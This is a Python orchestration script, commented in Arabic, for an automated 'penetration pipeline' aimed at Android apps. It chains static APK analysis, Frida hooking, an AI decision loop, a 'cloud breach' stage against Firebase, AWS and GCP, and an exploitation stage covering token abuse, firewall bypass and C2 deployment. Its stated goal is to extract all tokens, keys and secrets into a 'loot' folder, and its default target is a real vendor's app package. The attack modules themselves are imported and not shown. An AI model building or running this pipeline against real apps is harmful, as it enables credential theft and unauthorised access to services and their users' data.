#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — UNIFIED PENETRATION PIPELINE (hayo_pipeline.py)
===============================================================
نظام الاختراق المتكامل - يربط جميع المحركات في سلسلة واحدة:

  المرحلة 1: المحرك الساكن (Static Engine)
    ↓ استخراج المعلومات والتوقيعات
  المرحلة 2: المحرك الديناميكي (Dynamic Engine)
    ↓ Frida hooks عميقة + استكشاف AI
  المرحلة 3: العقل المدبر (AI Brain / War Room)
    ↓ تحليل واتخاذ القرارات
  المرحلة 4: اختراق السحابة (Cloud Breach Engine)
    ↓ Firebase, AWS, GCP, WAF Bypass
  المرحلة 5: غرفة عمليات الاستغلال (Exploitation War Room)
    ↓ C2, Token Exploitation, Firewall Penetration
  المرحلة 6: التقرير النهائي (Final Report)

"""
import argparse
import json
import os
import sys
import threading
import time
from datetime import datetime

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
B = "\033[94m"; M = "\033[95m"; X = "\033[0m"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

# -- وحدة التحكم الرئيسية --------------------------------------------------

class HayoPipeline:
    """
    الأنبوب الرئيسي - يدير جميع مراحل الاختراق بالتسلسل الصحيح
    """
    
    def __init__(self, package, device="emulator-5554", duration=300, verbose=True):
        self.package = package
        self.device = device
        self.duration = duration
        self.verbose = verbose
        self.goal = ("reach login, premium, cloud-sync, settings and account screens; "
                     "extract all tokens, keys and secrets")

        self.adb = self._resolve_adb()
        self.loot_dir = os.path.join(HERE, "loot")
        os.makedirs(self.loot_dir, exist_ok=True)
        
        # Data store (shared blackboard)
        from intel_store import IntelStore
        self.store = IntelStore(package)
        
        # Phase results
        self.static_report = None
        self.dynamic_results = None
        self.cloud_results = None
        self.exploit_summary = None
        self.final_report = None
        
        # Status
        self.running = False
        self.current_phase = "idle"
        self.start_time = None
        self.errors = []
        
    @staticmethod
    def _resolve_adb():
        """Find a usable adb.exe across known locations, else fall back to PATH."""
        import shutil
        candidates = [
            r"C:\Users\PT\Downloads\platform-tools\adb.exe",
            r"D:\LDPlayer\LDPlayer9\adb.exe",
        ]
        for p in candidates:
            if os.path.isfile(p):
                return p
        return shutil.which("adb") or candidates[0]

    def log(self, msg, color=C):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{ts} PIPELINE] {msg}{X}")

    def phase_header(self, num, name, description):
        print(f"\n{M}{'-'*65}{X}")
        print(f"{M}  المرحلة {num}: {name}{X}")
        print(f"{M}  {description}{X}")
        print(f"{M}{'-'*65}{X}\n")

    def phase_footer(self, success=True):
        status = f"{G}✓ اكتملت بنجاح" if success else f"{R}✗ فشلت"
        print(f"\n{status}{X}")
        print(f"{C}{'-'*65}{X}\n")

    def run_static(self):
        """المرحلة 1: المحرك الساكن"""
        self.phase_header(1, "المحرك الساكن - Static Engine", 
                         "تحليل APK، استخراج الأذونات، المكونات، المفاتيح، endpoints")
        self.current_phase = "static"
        
        from static_engine import StaticEngine
        engine = StaticEngine(self.package, store=self.store, device=self.device)
        
        try:
            self.static_report = engine.run_full_static()
            self.store.add("note", "static_phase_complete", source="pipeline")
            self.phase_footer(True)
            return True
        except Exception as e:
            self.errors.append(f"Static failed: {e}")
            self.log(f"خطأ في المحرك الساكن: {e}", R)
            self.phase_footer(False)
            return False

    def run_dynamic(self):
        """المرحلة 2: المحرك الديناميكي العميق"""
        self.phase_header(2, "المحرك الديناميكي العميق - Deep Dynamic Engine",
                         "Frida hooks شاملة، استكشاف AI، استخراج runtime secrets")
        self.current_phase = "dynamic"
        
        adb_path = self.adb
        use_ai = True
        
        try:
            # Import and run enhanced dynamic engine
            from dynamic_engine import DynamicEngine
            from warroom_brain import WarRoomBrain
            
            brain = WarRoomBrain(self.package, store=self.store)

            # دمج نتائج الساكن في العقل + المخزن قبل الديناميكي — ليستفيد منها
            # الذكاء الاصطناعي آنياً في توجيه الاستكشاف (لا في مرحلة لاحقة).
            if self.static_report:
                brain.ingest_static_findings(self.static_report)
                n_sec = sum(len(v) for v in self.static_report.get("secrets", {}).values())
                n_ep = len(self.static_report.get("endpoints", []))
                self.log(f"دُمجت نتائج الساكن في العقل قبل الديناميكي: "
                         f"{n_sec} سر/مفتاح، {n_ep} نقطة نهاية → يوجّه الاستكشاف", G)

            eng = DynamicEngine(
                package=self.package,
                device=self.device,
                adb=adb_path,
                duration=self.duration,   # شبكة أمان قصوى فقط (until_goal=True)
                use_ai=use_ai,
                goal=self.goal,
                store=self.store,
                brain=brain,
                report=True,
                until_goal=True,          # قيادة حتى النجاح/التقارب بلا سقف زمني
            )
            
            # Override instrument script path to use the deep version
            deep_script = os.path.join(HERE, "scripts", "instrument_deep.js")
            if os.path.isfile(deep_script):
                from dynamic_engine import SCRIPT_PATH as _old_script
                # Patch it at module level before run
                import dynamic_engine as de
                de.SCRIPT_PATH = deep_script
                self.log(f"تم تحميل Frida hooks العميقة: instrument_deep.js", G)
            
            self.dynamic_results = eng.run()
            self.store.add("note", "dynamic_phase_complete", source="pipeline")
            
            # Feed dynamic findings to war room brain
            if self.dynamic_results and "findings" in self.dynamic_results:
                brain.ingest_dynamic_findings(self.dynamic_results["findings"])
            
            self.phase_footer(True)
            return True
            
        except Exception as e:
            self.errors.append(f"Dynamic failed: {e}")
            self.log(f"خطأ في المحرك الديناميكي: {e}", R)
            import traceback
            self.log(traceback.format_exc(), R)
            self.phase_footer(False)
            return False

    def run_brain_analysis(self):
        """المرحلة 3: العقل المدبر - التحليل واتخاذ القرارات"""
        self.phase_header(3, "العقل الذكي المدبر - AI WarRoom Brain",
                         "تحليل النتائج، تصنيف الثغرات، تخطيط الهجمات التالية")
        self.current_phase = "brain"
        
        from warroom_brain import WarRoomBrain
        brain = WarRoomBrain(self.package, store=self.store)
        
        try:
            # Feed static findings
            if self.static_report:
                brain.ingest_static_findings(self.static_report)
            
            # Feed dynamic findings
            if self.dynamic_results and "findings" in self.dynamic_results:
                brain.ingest_dynamic_findings(self.dynamic_results["findings"])
            
            # AI decision making
            next_action = brain.decide_next_action()
            self.log(f"القرار التالي للعقل المدبر: {next_action['action']} - {next_action['reason']}", C)
            
            self.brain_context = {
                "brain": brain,
                "next_action": next_action,
                "secrets": brain.all_secrets,
                "critical": brain.critical_findings,
                "cloud_targets": brain.cloud_targets
            }
            
            self.store.add("note", "brain_analysis_complete", source="pipeline")
            self.phase_footer(True)
            return True
            
        except Exception as e:
            self.errors.append(f"Brain analysis failed: {e}")
            self.log(f"خطأ في العقل المدبر: {e}", R)
            self.phase_footer(False)
            return False

    def run_cloud_breach(self):
        """المرحلة 4: اختراق السحابة"""
        self.phase_header(4, "اختراق السحابة - Cloud Breach Engine",
                         "Firebase, AWS, GCP, Supabase اختراق واستخراج البيانات")
        self.current_phase = "cloud_breach"
        
        from cloud_breach_engine import CloudBreachEngine
        
        try:
            # Gather endpoints and secrets
            endpoints = []
            secrets = {}
            
            if self.static_report:
                endpoints.extend(self.static_report.get("endpoints", []))
                secrets.update(self.static_report.get("secrets", {}))
            
            if hasattr(self, 'brain_context') and self.brain_context:
                secrets.update(self.brain_context.get("secrets", {}))
                endpoints.extend(self.brain_context.get("cloud_targets", []))
            
            # Deduplicate
            endpoints = list(set(endpoints))
            
            engine = CloudBreachEngine(self.package, store=self.store, device=self.device)
            self.cloud_results = engine.run_full_breach(endpoints, secrets)
            
            self.store.add("note", "cloud_breach_complete", source="pipeline")
            self.phase_footer(True)
            return True
            
        except Exception as e:
            self.errors.append(f"Cloud breach failed: {e}")
            self.log(f"خطأ في اختراق السحابة: {e}", R)
            import traceback
            self.log(traceback.format_exc(), R)
            self.phase_footer(False)
            return False

    def run_exploitation(self):
        """المرحلة 5: غرفة عمليات الاستغلال"""
        self.phase_header(5, "غرفة عمليات الاستغلال - Exploitation War Room",
                         "استغلال الثغرات، اختراق جدران الحماية، C2, توكنات")
        self.current_phase = "exploitation"
        
        from exploit_warroom import ExploitWarRoom
        
        try:
            # Gather all intel
            secrets = {}
            endpoints = []
            
            # From static
            if self.static_report:
                secrets.update(self.static_report.get("secrets", {}))
                endpoints.extend(self.static_report.get("endpoints", []))
            
            # From brain
            if hasattr(self, 'brain_context') and self.brain_context:
                if self.brain_context.get("secrets"):
                    secrets.update(self.brain_context["secrets"])
            
            # From cloud
            if self.cloud_results:
                endpoints.extend(self.cloud_results.get("breached_endpoints", []))
            
            endpoints = list(set(endpoints))
            
            engine = ExploitWarRoom(self.package, store=self.store, device=self.device)
            
            # Run exploitation phases
            token_results = engine.run_token_exploitation(secrets)
            self.log(f"استغلال التوكنات: {len(token_results)} نتيجة", Y)
            
            fw_results = engine.run_firewall_penetration(endpoints)
            self.log(f"اختراق جدران الحماية: {len(fw_results)} نجاح", Y)
            
            c2_result = engine.run_c2_deployment()
            self.log(f"C2: {c2_result.get('status', '?')}", Y)
            
            self.exploit_summary = engine.generate_exploit_summary(
                secrets, endpoints, self.cloud_results or {}, 
                self.dynamic_results.get("findings", []) if self.dynamic_results else []
            )
            
            self.store.add("note", "exploitation_complete", source="pipeline")
            self.phase_footer(True)
            return True
            
        except Exception as e:
            self.errors.append(f"Exploitation failed: {e}")
            self.log(f"خطأ في الاستغلال: {e}", R)
            self.phase_footer(False)
            return False

    def generate_final_report(self):
        """المرحلة 6: التقرير النهائي"""
        self.phase_header(6, "التقرير النهائي - Final Report",
                         "تجميع جميع النتائج في تقرير شامل")
        self.current_phase = "reporting"
        
        try:
            report = {
                "package": self.package,
                "device": self.device,
                "timestamp": datetime.now().isoformat(),
                "duration_seconds": round(time.time() - self.start_time, 1) if self.start_time else 0,
                "pipeline_status": {
                    "static": self.static_report is not None,
                    "dynamic": self.dynamic_results is not None,
                    "brain_analysis": hasattr(self, 'brain_context'),
                    "cloud_breach": self.cloud_results is not None,
                    "exploitation": self.exploit_summary is not None
                },
                "errors": self.errors
            }
            
            # Static summary
            if self.static_report:
                report["static_analysis"] = {
                    "secrets_found": {k: len(v) if isinstance(v, list) else 1 
                                     for k, v in self.static_report.get("secrets", {}).items()},
                    "total_endpoints": len(self.static_report.get("endpoints", [])),
                    "activities": len(self.static_report.get("manifest", {}).get("activities", [])),
                    "permissions": len(self.static_report.get("manifest", {}).get("permissions", []))
                }
            
            # Dynamic summary
            if self.dynamic_results:
                report["dynamic_analysis"] = {
                    "total_findings": len(self.dynamic_results.get("findings", [])),
                    "screens_visited": len(self.dynamic_results.get("visited", [])),
                    "exploration_steps": self.dynamic_results.get("explore_steps", 0)
                }
            
            # Cloud summary
            if self.cloud_results:
                report["cloud_breach"] = {
                    "exploited_services": self.cloud_results.get("exploited_services", []),
                    "breached_endpoints": len(self.cloud_results.get("breached_endpoints", [])),
                    "extracted_keys": len(self.cloud_results.get("extracted_keys", {})),
                    "bypassed_firewalls": len(self.cloud_results.get("bypassed_firewalls", []))
                }
            
            # Exploitation summary
            if self.exploit_summary:
                report["exploitation"] = self.exploit_summary
            
            report_path = os.path.join(self.loot_dir, f"pipeline_report_{self.package.replace('.', '_')}.json")
            with open(report_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2, default=str)
            
            self.final_report = report
            
            print(f"\n{G}{'*'*60}{X}")
            print(f"{G}  تقرير الاختبار النهائي{X}")
            print(f"{G}{'*'*60}{X}")
            print(f"{G}  الحزمة: {self.package}{X}")
            print(f"{G}  المدة: {report['duration_seconds']} ثانية{X}")
            print(f"{G}  الثغرات المكتشفة: {len(self.errors)} خطأ{X}")
            
            if "static_analysis" in report:
                sa = report["static_analysis"]
                print(f"{G}  - تحليل ساكن: {sa.get('secrets_found', {})} أسرار, {sa.get('total_endpoints', 0)} endpoint{X}")
            
            if "dynamic_analysis" in report:
                da = report["dynamic_analysis"]
                print(f"{G}  - تحليل ديناميكي: {da.get('total_findings', 0)} نتيجة, {da.get('screens_visited', 0)} شاشة{X}")
            
            if "cloud_breach" in report:
                cb = report["cloud_breach"]
                print(f"{G}  - اختراق سحابة: {cb.get('exploited_services', [])}, {cb.get('breached_endpoints', 0)} نقطة{X}")
            
            if "exploitation" in report:
                ex = report["exploitation"]
                print(f"{G}  - استغلال: {ex.get('total_secrets_harvested', 0)} سر, {ex.get('firewalls_bypassed', 0)} جدار{X}")
            
            print(f"{G}  التقرير: {report_path}{X}")
            print(f"{G}{'*'*60}{X}\n")
            
            return True
            
        except Exception as e:
            self.errors.append(f"Report failed: {e}")
            self.log(f"خطأ في التقرير: {e}", R)
            return False

    def _goal_reached(self):
        """هل تحقّق الهدف؟ النجاح = نتائج وقت-التشغيل (ديناميكي) أو اختراق سحابي —
        وليس أسرار الساكن (فهي موجودة سلفاً، وكانت تُسبّب «نجاحاً» كاذباً يوقف الحلقة)."""
        # 1) نتائج ديناميكية حرجة/عالية (runtime — التُقطت أثناء التشغيل)
        dyn = self.dynamic_results if isinstance(self.dynamic_results, dict) else {}
        for f in dyn.get("findings", []) or []:
            if str(f.get("severity", "")).lower() in ("critical", "high"):
                return True
        # 2) أسرار وقت-التشغيل في العقل (source=dynamic فقط)
        ctx = getattr(self, "brain_context", None) or {}
        brain = ctx.get("brain")
        if brain is not None:
            dyn_secrets = (getattr(brain, "all_secrets", {}) or {}).get("dynamic") or []
            if dyn_secrets:
                return True
        # 3) اختراق سحابي ناجح (بيانات مُستخرَجة/وصول مؤكّد)
        cloud = self.cloud_results if isinstance(self.cloud_results, dict) else {}
        if any(cloud.get(k) for k in ("breached", "secrets_extracted", "accessible", "extracted", "loot")):
            return True
        return False

    def run_adaptive_pipeline(self, max_rounds=3):
        """
        زر واحد → المسار الكامل بقيادة الذكاء الاصطناعي:
          (1) تحليل ساكن  → مستخرجات
          (2) حلقة تكيّفية: تحليل ديناميكي → مستخرجات، ثم العقل المدبر يدمج
              مخرجات المحرّكين آنياً ويقرّر الخطوة التالية. إن لم يتحقّق الهدف
              يعيد جولة ديناميكية موجّهة بقرار العقل — حتى النجاح أو نفاد الجولات.
          (3) اختراق سحابة → استغلال → تقرير نهائي.
        """
        self.running = True
        self.start_time = time.time()

        print(f"\n{M}{'='*65}{X}")
        print(f"{M}  HAYO Cipher-7 — المسار التكيّفي بقيادة الذكاء الاصطناعي{X}")
        print(f"{M}  الهدف: {self.package} | الجهاز: {self.device}{X}")
        print(f"{M}  أقصى جولات ذكية: {max_rounds} | مدة كل جولة ديناميكية: {self.duration}s{X}")
        print(f"{M}{'='*65}{X}\n")

        results = {}

        # (1) الساكن مرة واحدة
        self.log("بدء: التحليل الساكن", C)
        results["التحليل الساكن"] = "✓" if self.run_static() else "✗"

        # (2) الحلقة التكيّفية: ديناميكي + عقل مدبر حتى النجاح
        round_num = 0
        while round_num < max_rounds:
            round_num += 1
            self.log(f"═══ الجولة الذكية {round_num}/{max_rounds} ═══", M)

            self.log(f"بدء: التحليل الديناميكي (جولة {round_num})", C)
            dyn_ok = self.run_dynamic()
            results[f"ديناميكي ج{round_num}"] = "✓" if dyn_ok else "✗"

            self.log(f"بدء: تحليل العقل المدبر (جولة {round_num})", C)
            brain_ok = self.run_brain_analysis()
            results[f"عقل مدبر ج{round_num}"] = "✓" if brain_ok else "✗"

            if self._goal_reached():
                self.log(f"✓ العقل المدبر حقّق الهدف في الجولة {round_num} — استخرجت أسرار/نتائج حرجة.", G)
                break

            if round_num < max_rounds:
                nxt = getattr(self, "brain_context", {}).get("next_action", {}) or {}
                new_goal = nxt.get("reason") or nxt.get("action")
                if new_goal:
                    self.goal = str(new_goal)
                    self.log(f"↻ لم يتحقّق الهدف بعد — العقل يوجّه الجولة القادمة نحو: {self.goal[:70]}", Y)
                else:
                    self.log("↻ لم يتحقّق الهدف بعد — إعادة استكشاف ديناميكي أعمق.", Y)
            else:
                self.log("⚠ انتهت الجولات الذكية دون تحقيق الهدف الكامل — نكمل بما استُخرج.", Y)

        # (3) السحابة → الاستغلال → التقرير
        for phase_name, phase_func in [
            ("اختراق السحابة", self.run_cloud_breach),
            ("غرفة الاستغلال", self.run_exploitation),
            ("التقرير النهائي", self.generate_final_report),
        ]:
            self.log(f"بدء: {phase_name}", C)
            results[phase_name] = "✓" if phase_func() else "✗"

        elapsed = round(time.time() - self.start_time, 1)
        print(f"\n{G}{'-'*65}{X}")
        print(f"{G}  ملخص المسار التكيّفي:{X}")
        for name, st in results.items():
            print(f"{G}    {st} {name}{X}")
        print(f"{G}  الجولات الذكية المنفّذة: {round_num}{X}")
        print(f"{G}  الوقت الإجمالي: {elapsed} ثانية | الأخطاء: {len(self.errors)}{X}")
        print(f"{G}{'-'*65}{X}\n")

        self.running = False
        return self.final_report

    def run_full_pipeline(self):
        """تشغيل جميع المراحل بالتسلسل"""
        self.running = True
        self.start_time = time.time()
        
        print(f"\n{M}{'='*65}{X}")
        print(f"{M}  HAYO Cipher-7 — نظام الاختراق المتكامل{X}")
        print(f"{M}  الهدف: {self.package} | الجهاز: {self.device}{X}")
        print(f"{M}  الوقت: {self.duration} ثانية للمرحلة الديناميكية{X}")
        print(f"{M}{'='*65}{X}\n")
        
        phases = [
            ("التحليل الساكن", self.run_static),
            ("التحليل الديناميكي", self.run_dynamic),
            ("تحليل العقل المدبر", self.run_brain_analysis),
            ("اختراق السحابة", self.run_cloud_breach),
            ("غرفة الاستغلال", self.run_exploitation),
            ("التقرير النهائي", self.generate_final_report),
        ]
        
        results = {}
        for phase_name, phase_func in phases:
            self.log(f"بدء: {phase_name}", C)
            success = phase_func()
            results[phase_name] = "✓" if success else "✗"
            
            if not success:
                self.log(f"المرحلة {phase_name} فشلت، لكننا نكمل...", Y)
        
        elapsed = round(time.time() - self.start_time, 1)
        
        print(f"\n{G}{'-'*65}{X}")
        print(f"{G}  ملخص النتائج النهائي:{X}")
        for name, status in results.items():
            print(f"{G}    {status} {name}{X}")
        print(f"{G}  الوقت الإجمالي: {elapsed} ثانية{X}")
        print(f"{G}  الأخطاء: {len(self.errors)}{X}")
        print(f"{G}{'-'*65}{X}\n")
        
        self.running = False
        return self.final_report


def main():
    ap = argparse.ArgumentParser(description="HAYO Cipher-7 — Pipeline الكامل")
    ap.add_argument("--package", "-p", default="com.anthropic.claude", 
                    help="Package name (default: com.anthropic.claude)")
    ap.add_argument("--device", "-d", default="emulator-5554")
    ap.add_argument("--duration", type=int, default=300,
                    help="Dynamic phase duration in seconds (default: 300)")
    ap.add_argument("--skip-static", action="store_true", help="تخطي المرحلة الساكنة")
    ap.add_argument("--skip-dynamic", action="store_true", help="تخطي المرحلة الديناميكية")
    ap.add_argument("--skip-cloud", action="store_true", help="تخطي اختراق السحابة")
    ap.add_argument("--adaptive", action="store_true",
                    help="المسار التكيّفي: العقل يعيد جولات ديناميكية حتى النجاح")
    ap.add_argument("--max-rounds", type=int, default=3,
                    help="أقصى عدد جولات ذكية في الوضع التكيّفي (افتراضي 3)")
    
    if os.name == 'nt':
        import subprocess
        subprocess.run('chcp 65001 > nul', shell=True)
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        except: pass
    args = ap.parse_args()
    
    pipeline = HayoPipeline(args.package, args.device, args.duration)
    
    # If skipping phases, we still need to feed data
    if args.skip_static or args.skip_dynamic:
        # Load existing data from loot
        from intel_store import IntelStore
        store = IntelStore(args.package)
        
        if args.skip_static:
            # Try loading cached static report
            static_dir = os.path.join(HERE, "loot", f"static_{args.package.replace('.', '_')}")
            static_report_path = os.path.join(static_dir, "static_report.json")
            if os.path.isfile(static_report_path):
                with open(static_report_path) as f:
                    pipeline.static_report = json.load(f)
                pipeline.log("تم تحميل التقرير الساكن من الذاكرة", G)
    
    pipeline.log("بدء الأنبوب الرئيسي...", M)
    if args.adaptive:
        pipeline.run_adaptive_pipeline(max_rounds=args.max_rounds)
    else:
        pipeline.run_full_pipeline()
    
    # Share files
    report_path = os.path.join(HERE, "loot", f"pipeline_report_{args.package.replace('.', '_')}.json")
    if os.path.isfile(report_path):
        print(f"\n{C}التقرير النهائي محفوظ في: {report_path}{X}")


if __name__ == "__main__":
    main()
